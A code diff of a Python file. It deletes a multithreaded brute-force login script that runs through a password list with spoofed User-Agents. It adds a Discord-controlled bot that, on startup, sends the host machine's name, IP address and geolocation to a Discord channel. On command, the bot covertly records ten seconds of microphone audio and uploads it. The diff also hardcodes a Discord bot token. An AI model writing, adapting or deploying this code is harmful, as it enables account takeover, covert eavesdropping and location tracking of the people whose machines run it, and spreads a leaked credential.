@@ -1,89 +1,94 @@
+import discord
+from discord.ext import commands, tasks
+import pyaudio
+import wave
+import os
+import socket
 import requests
-import argparse
-import threading
+import geocoder
 import time
-import random
-from concurrent.futures import ThreadPoolExecutor
-from requests.adapters import HTTPAdapter
-from urllib3.util.retry import Retry
-from fake_useragent import UserAgent
+import threading
 
-# Function to attempt login with a given username and password
-def try_login(url, username, password, session):
-    payload = {
-        'username': username,
-        'password': password
-    }
-    
-    # Custom headers (User-Agent spoofing)
-    headers = {
-        'User-Agent': UserAgent().random
-    }
+# Initialize the bot
+intents = discord.Intents.default()
+intents.message_content = True
+bot = commands.Bot(command_prefix="!", intents=intents)
 
-    try:
-        # Perform the login POST request (this assumes the login form uses these parameter names)
-        response = session.post(url, data=payload, headers=headers, timeout=10)
+# Define the directory for storing audio recordings
+RECORDINGS_DIR = "recordings"
+if not os.path.exists(RECORDINGS_DIR):
+    os.makedirs(RECORDINGS_DIR)
 
-        # Check for successful login based on response (modify based on the target page behavior)
-        if "Login successful" in response.text:  # Customize this based on the actual response
-            print(f"Success! Found password: {password}")
-            return True
-        elif "incorrect" in response.text:  # Customize this based on actual response
-            print(f"Failed attempt with password: {password}")
-        else:
-            print("Unexpected response, check the form structure")
+# Function to get system information
+def get_system_info():
+    system_name = socket.gethostname()
+    system_ip = socket.gethostbyname(system_name)
     
-    except requests.RequestException as e:
-        print(f"Error making request: {e}")
-    
-    return False
+    # Get geolocation based on the IP
+    g = geocoder.ip(system_ip)
+    geolocation = g.json
 
-# Function to read the password list file
-def load_password_list(file_path):
-    with open(file_path, 'r') as file:
-        passwords = [line.strip() for line in file.readlines()]
-    return passwords
+    return system_name, system_ip, geolocation
 
-# Retry logic for requests (to handle rate limiting, timeouts, etc.)
-def create_session():
-    session = requests.Session()
+# Send system info to the server
+def send_system_info_to_server():
+    system_name, system_ip, geolocation = get_system_info()
+    message = f"PC Name: {system_name}\nIP Address: {system_ip}\nLocation: {geolocation.get('city', 'Unknown')}, {geolocation.get('country', 'Unknown')}"
     
-    # Retry logic
-    retry = Retry(
-        total=3,
-        backoff_factor=0.5,  # exponential backoff
-        status_forcelist=[500, 502, 503, 504],
-        method_whitelist=["GET", "POST"]
-    )
-    adapter = HTTPAdapter(max_retries=retry)
-    session.mount("http://", adapter)
-    session.mount("https://", adapter)
-    
-    return session
+    # Send this info to a server (or a Discord channel, for example)
+    channel = bot.get_channel(YOUR_CHANNEL_ID_HERE)  # Replace with your actual channel ID
+    if channel:
+        bot.loop.create_task(channel.send(message))
 
-# Main function to handle the brute force process
-def brute_force(url, username, password_file):
-    passwords = load_password_list(password_file)
-    
-    # Create a session with retry logic and custom headers
-    session = create_session()
-    
-    with ThreadPoolExecutor(max_workers=20) as executor:
-        futures = []
-        for password in passwords:
-            # Submit password attempts concurrently
-            futures.append(executor.submit(try_login, url, username, password, session))
-        
-        # Wait for all threads to finish
-        for future in futures:
-            future.result()
+# Command to start recording
+@bot.command()
+async def start_record(ctx):
+    await ctx.send("Starting recording for 10 seconds...")
 
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Advanced Brute Force Login Script")
-    parser.add_argument("url", help="The URL of the login page")
-    parser.add_argument("username", help="The username to brute force with")
-    parser.add_argument("-P", "--passwordfile", help="The path to the password list file", required=True)
-    
-    args = parser.parse_args()
-    
-    brute_force(args.url, args.username, args.passwordfile)
+    # Create a new thread to handle the recording
+    thread = threading.Thread(target=record_audio)
+    thread.start()
+
+    # Wait for the recording to finish and send it back to the server
+    time.sleep(10)
+    await ctx.send(file=discord.File("recordings/recording.wav"))
+
+# Function to record audio for 10 seconds and save to file
+def record_audio():
+    p = pyaudio.PyAudio()
+
+    # Set up audio parameters
+    FORMAT = pyaudio.paInt16
+    CHANNELS = 1
+    RATE = 44100
+    CHUNK = 1024
+    RECORD_SECONDS = 10
+    WAVE_OUTPUT_FILENAME = os.path.join(RECORDINGS_DIR, "recording.wav")
+
+    # Open stream and record audio
+    stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
+
+    frames = []
+    for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
+        data = stream.read(CHUNK)
+        frames.append(data)
+
+    stream.stop_stream()
+    stream.close()
+    p.terminate()
+
+    # Save the recorded audio to a file
+    with wave.open(WAVE_OUTPUT_FILENAME, 'wb') as wf:
+        wf.setnchannels(CHANNELS)
+        wf.setsampwidth(p.get_sample_size(FORMAT))
+        wf.setframerate(RATE)
+        wf.writeframes(b''.join(frames))
+
+# Event that runs when the bot is ready
+@bot.event
+async def on_ready():
+    print(f'Logged in as {bot.user}')
+    send_system_info_to_server()  # Send system info to the server on bot start
+
+# Run the bot
+bot.run("MTI3NTQ3NjIwMjgwNjU3NTIzNw.GMSKsE.PLdRXSTVISc8Ttp80UPayMMcD0fjank9Kqc2jU")  # Replace with your bot's token
